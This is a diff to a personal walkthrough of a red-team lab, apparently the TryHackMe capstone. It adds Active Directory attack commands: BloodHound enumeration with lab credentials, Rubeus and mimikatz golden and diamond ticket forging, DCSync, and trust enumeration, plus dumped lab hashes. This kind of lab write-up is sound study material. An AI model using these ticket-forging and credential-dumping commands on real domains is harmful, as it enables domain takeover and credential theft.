@@ -979,7 +979,7 @@ IoC: `wmic` mounts and writes output to `ADMIN$` share by default.
 ```
 
 
-```
+```bash
 proxychains4 python3 /opt/BloodHound.py/bloodhound.py --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.117.102 -u 'NVM2' -p 'p@ssw0rd1!'
 ```
 
@@ -1015,7 +1015,7 @@ proxychains4 impacket-ticketer -request -domain 'CORP.THERESERVE.LOC' -user 'Adm
 .\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519
 ```
 
-
+Because of potential issues with changes made by others users on this reset. I went away thinking I still really wanted to try both `rubeus` and `impacket-ticketer`, but I am going to need to just use `mimikatz`  
 ```go
 // Perform S4U constrained delegation abuse across domains:
 
@@ -1025,8 +1025,131 @@ Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </imperson
 
 ![](enterprisetargetadmins.png)
 
-[1:51](https://www.twitch.tv/videos/1833475098) 
 
+
+#### Returning to overcome other users and time
+
+From a [XCT Wutai](https://www.youtube.com/watch?v=ekep6_x0iQM&pp=ygUJeGN0IFd1dGFp)  video I was introduced to `execute-assembly` and what that actually command actually entails. [Dominic Breuker](https://dominicbreuker.com/post/learning_sliver_c2_09_execute_assembly/) explains `execute-assembly` runs any .NET assembly as a executable or DLL completely in memory either in a:
+- Sacrificial Process 
+- Implant process
+A .NET assembly is converted to position-independent shell code with [Donut](https://github.com/thewover/donut) then injected into target process; for in-process execution, a library called [go-clr](https://github.com/Ne0nd0g/go-clr) is used instead of [Donut](https://github.com/thewover/donut) .  
+```go
+execute-assembly -s -i $localpath/Tool.exe -- -$flagsAndArgsOfTool
+```
+
+```
+Administrator : 0ee3d5c856f5a3d36986fbe3193e13d3
+krbtgt : 0c757a3445acb94a654554f3ac529ede
+```
+
+```
+rubeus asktgs /ticket:C:\nvm\.kirbi 
+/service: service type [cifs/mcorpdc.moneycorp.local]   
+/dc: domain controller [mcorp-dc.moneycorp.local]   
+/ptt**
+```
+
+[harmj0y's](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/) Domain Trust Attack Strategy
+1) Enumerate all trusts 
+2) Enumerate all users/groups/computers that either:
+	- Have access to resources
+	- Are in groups or have users from another domain
+3) Perform targeted account compromise 
+
+Enumerate with: Bloodhound, .NET methods,  Win32API, LDAP, PowerView.ps1
+
+[snovvcrash.rocks](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/attack-trusts)
+```powershell
+# Get Child domain FQDN
+$env:userdnsdomain
+# Get Forest Object
+PV2 > Get-NetForest [-Forest megacorp.local]
+PV3 > Get-Forest [-Forest megacorp.local]
+# Get all domains in a forest:
+PV2 > Get-NetForestDomain [-Forest megacorp.local]
+PV3 > Get-ForestDomain [-Forest megacorp.local]
+# Enumerate trusts for current domain via .NET 
+nltest /trusted_domains
+# Enumerate trusts via Win32 API (PowerView):
+PV2 > Get-NetDomainTrust [-Domain megacorp.local] | ft
+PV3 > Get-DomainTrust -API [-Domain megacorp.local] | ft
+# Enumerate trusts via LDAP (PowerView):
+PV2 > Get-NetDomainTrust -LDAP [-Domain megacorp.local] | ft
+PV3 > Get-DomainTrust [-Domain megacorp.local] | ft
+```
+
+SIDHistory/ExtraSIDs hopping
+```powershell
+netdom.exe trust corp.thereserve.loc /domain:thereserve.loc /quarantine
+```
+
+![](harmj0yandsnovvcrashattackingaddomaintrusts.png)
+
+Create a Cross-trust Golden ticket 
+
+Get Child domain FQDN:
+```powershell
+PS > $env:userdnsdomain
+```
+
+Child domain's DC machine account and its RID:
+```powershell
+PV2 > (Get-NetComputer -ComputerName DC01.child.megacorp.local -FullData | select ObjectSID).ObjectSID
+PV3 > (Get-DomainComputer DC01.corp.megacorp.local | select ObjectSID).ObjectSID
+```
+
+Get child domain SID
+```powershell
+PV > Get-DomainSID
+```
+
+SID of the parent domain
+```powershell
+PS > (New-Object System.Security.Principal.NTAccount("megacorp.local","krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
+```
+
+Create cross-trust golden ticket
+```powershell
+# mimikatz
+kerberos::golden /domain:child.megacorp.local /user:DC01$ /id:1337 /groups:516 /sid:S-1-5-21-4266912945-3985045794-2943778634 /sids:S-1-5-21-2284550090-1208917427-1204316795-516,S-1-5-9 /krbtgt:00ff00ff00ff00ff00ff00ff00ff00ff /ptt [/startoffset:-10 /endin:60 /renewmax:10080]
+```
+
+DC Sync
+```powershell
+lsadump::dcsync /user:thereserve.loc\krbtgt /domain:thereserve.local
+ERROR kull_m_net_getDC ; DsGetDcName: 1355
+ERROR kuhl_m_lsadump_dcsync ; Domain Controller not present
+```
+
+This then becomes for RTCC as we are going from parent to:
+```powershell
+# Parent domain
+([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest())[0].RootDomain.Name
+local
+# THERESERVE.LOC
+
+Get-DomainSID
+# S-1-5-21-170228521-1485475711-3199862024
+(New-Object System.Security.Principal.NTAccount("thereserve.loc","krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
+# S-1-5-21-1255581842-1300659601-3764024703-502
+
+# mimikatz
+kerberos::golden /domain:thereserve.loc /user:NVM2 /id:1337 /groups:516 /sid:S-1-5-21-170228521-1485475711-3199862024 /sids:S-1-5-21-1255581842-1300659601-3764024703-502,S-1-5-9 /krbtgt:00ff00ff00ff00ff00ff00ff00ff00ff /ptt [/startoffset:-10 /endin:60 /renewmax:10080]
+
+(Get-DomainComputer ROOTDC.thereserve.loc | select ObjectSID).ObjectSID
+([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest())[0].RootDomain.Name
+
+
+```
+
+Then [Alh4zr3d started streaming](https://www.twitch.tv/alh4zr3d). Whom was on a mission to finish this before his other commitments and the previous stream I had not finished he ran into issues. With time to finish this not on my side and people I learnt of:
+```powershell
+# Troll in the network!!! 
+# Change the keyboard layout 
+Set-WinUserLanguageList -Force 'en-US'
+```
+
+I decided the best thing for me completing this is to showcase a writeup from the hack smarter community [https://0xb0b.gitbook.io/writeups/tryhackme/red-team-capstone-challenge](https://0xb0b.gitbook.io/writeups/tryhackme/red-team-capstone-challenge)
 
 https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/diamond-ticket
 https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond
